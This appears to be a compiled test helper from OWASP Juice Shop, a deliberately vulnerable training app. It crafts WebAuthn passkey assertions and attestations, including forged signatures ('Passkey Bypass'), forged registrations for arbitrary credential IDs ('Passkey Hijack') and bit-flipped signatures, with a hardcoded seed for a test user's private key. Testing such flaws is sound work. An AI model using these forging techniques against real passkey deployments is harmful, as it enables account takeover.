"use strict";
/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ORIGIN = void 0;
exports.loadVictimCredential = loadVictimCredential;
exports.authData = authData;
exports.coseFromJwk = coseFromJwk;
exports.buildAssertion = buildAssertion;
exports.buildAttestation = buildAttestation;
exports.flipBit = flipBit;
const node_crypto_1 = __importDefault(require("node:crypto"));
const strict_1 = __importDefault(require("node:assert/strict"));
const helpers_1 = require("@simplewebauthn/server/helpers");
const staticData_1 = require("../../../data/staticData");
// The server derives the relying party from the request's Host/X-Forwarded-* headers (see
// routes/passkey.ts). Tests send `Host: localhost:3000` unless they exercise another origin.
exports.ORIGIN = 'http://localhost:3000';
const sha256 = (b) => node_crypto_1.default.createHash('sha256').update(b).digest();
// The private key of the passkey seeded for passkey-user in data/static/users.yml is the SHA-256 of
// this seed, so it can be re-derived on every run instead of being committed alongside the tests.
const VICTIM_KEY_SEED = '38d2908cb7950941e6445d6b9ff2e385dc07b6de48efe26897cc89f2f3c6d439';
/** The seeded victim passkey plus its matching private key, for crafting raw assertions. */
async function loadVictimCredential() {
    const ecdh = node_crypto_1.default.createECDH('prime256v1');
    ecdh.setPrivateKey(sha256(Buffer.from(VICTIM_KEY_SEED)));
    const point = ecdh.getPublicKey(); // 0x04 | x(32) | y(32)
    const jwk = {
        kty: 'EC',
        crv: 'P-256',
        d: helpers_1.isoBase64URL.fromBuffer(ecdh.getPrivateKey()),
        x: helpers_1.isoBase64URL.fromBuffer(point.subarray(1, 33)),
        y: helpers_1.isoBase64URL.fromBuffer(point.subarray(33))
    };
    const publicKeyCose = helpers_1.isoBase64URL.fromBuffer(coseFromJwk(jwk));
    const users = await (0, staticData_1.loadStaticUserData)();
    const [seeded] = users.find(({ key }) => key === 'passkeyUser')?.passkeys ?? [];
    strict_1.default.equal(seeded?.publicKey, publicKeyCose, 'publicKey of passkey-user in data/static/users.yml must be the one derived from VICTIM_KEY_SEED');
    return {
        credentialID: seeded.credentialID,
        publicKeyCose,
        privateKeyPem: node_crypto_1.default.createPrivateKey({ key: jwk, format: 'jwk' }).export({ format: 'pem', type: 'pkcs8' }).toString()
    };
}
// authenticatorData = rpIdHash(32) | flags(1) | signCount(4) | [attestedCredentialData]
function authData(rpID, flags, counter, attested) {
    const f = Buffer.from([flags]);
    const c = Buffer.alloc(4);
    c.writeUInt32BE(counter);
    return Buffer.concat([sha256(Buffer.from(rpID)), f, c, ...(attested ? [attested] : [])]);
}
// COSE EC2/ES256 public key from a Node JWK.
function coseFromJwk(jwk) {
    const x = helpers_1.isoBase64URL.toBuffer(jwk.x);
    const y = helpers_1.isoBase64URL.toBuffer(jwk.y);
    const b = [0xa5, 1, 2, 3, 0x26, 0x20, 1, 0x21, 0x58, 0x20, ...x, 0x22, 0x58, 0x20, ...y];
    return Buffer.from(b);
}
function clientDataJSON(type, challenge, origin) {
    return Buffer.from(JSON.stringify({ type, challenge, origin, crossOrigin: false }));
}
/**
 * Mint an ES256 assertion for the victim credential. With `tamper` the signature is produced with a
 * throwaway key of the same curve: well-formed DER that fails verification against the victim's
 * stored public key (the "Passkey Bypass" exploit). A genuine assertion is signed with
 * the victim's own key.
 */
function buildAssertion(victim, challenge, { tamper, counter = 1, origin = exports.ORIGIN, flags = 0x05 }) {
    const clientData = clientDataJSON('webauthn.get', challenge, origin);
    const ad = authData(new URL(origin).hostname, flags, counter); // default flags: UP | UV
    const signed = Buffer.concat([ad, sha256(clientData)]);
    const key = tamper
        ? node_crypto_1.default.generateKeyPairSync('ec', { namedCurve: 'P-256' }).privateKey
        : node_crypto_1.default.createPrivateKey(victim.privateKeyPem);
    const signature = node_crypto_1.default.sign('sha256', signed, { key, dsaEncoding: 'der' });
    return {
        id: victim.credentialID,
        rawId: victim.credentialID,
        type: 'public-key',
        clientExtensionResults: {},
        response: {
            authenticatorData: helpers_1.isoBase64URL.fromBuffer(ad),
            clientDataJSON: helpers_1.isoBase64URL.fromBuffer(clientData),
            signature: helpers_1.isoBase64URL.fromBuffer(signature)
        }
    };
}
/**
 * Forge a registration for an arbitrary credentialID using a freshly generated attacker keypair
 * (the "Passkey Hijack" exploit). Returns the attestation, the base64url COSE public key the server
 * is expected to persist, and the attacker's private key so a follow-up login can be signed with it.
 */
function buildAttestation(credentialID, challenge, { origin = exports.ORIGIN, flags = 0x45, aaguid = '00000000-0000-0000-0000-000000000000', fmt = 'none', attStmt = new Map() } = {}) {
    const { publicKey, privateKey } = node_crypto_1.default.generateKeyPairSync('ec', { namedCurve: 'P-256' });
    const cose = coseFromJwk(publicKey.export({ format: 'jwk' }));
    const credId = helpers_1.isoBase64URL.toBuffer(credentialID);
    const credIdLen = Buffer.alloc(2);
    credIdLen.writeUInt16BE(credId.length);
    const attested = Buffer.concat([Buffer.from(aaguid.replace(/-/g, ''), 'hex'), credIdLen, credId, cose]);
    const ad = authData(new URL(origin).hostname, flags, 0, attested); // default flags: UP | UV | AT
    const attestationObject = Buffer.from(helpers_1.isoCBOR.encode(new Map([
        ['fmt', fmt],
        ['attStmt', attStmt],
        ['authData', ad]
    ])));
    const clientData = clientDataJSON('webauthn.create', challenge, origin);
    return {
        attestation: {
            id: credentialID,
            rawId: credentialID,
            type: 'public-key',
            clientExtensionResults: {},
            response: {
                attestationObject: helpers_1.isoBase64URL.fromBuffer(attestationObject),
                clientDataJSON: helpers_1.isoBase64URL.fromBuffer(clientData),
                transports: ['internal']
            }
        },
        publicKey: helpers_1.isoBase64URL.fromBuffer(cose),
        privateKeyPem: privateKey.export({ format: 'pem', type: 'pkcs8' }).toString()
    };
}
/** Flip a single bit of a base64url-encoded value (e.g. an assertion signature). */
function flipBit(value, byteIndex, mask = 0x01) {
    const buf = Buffer.from(helpers_1.isoBase64URL.toBuffer(value));
    const i = byteIndex < 0 ? buf.length + byteIndex : byteIndex;
    buf[i] ^= mask;
    return helpers_1.isoBase64URL.fromBuffer(buf);
}
//# sourceMappingURL=passkey.js.map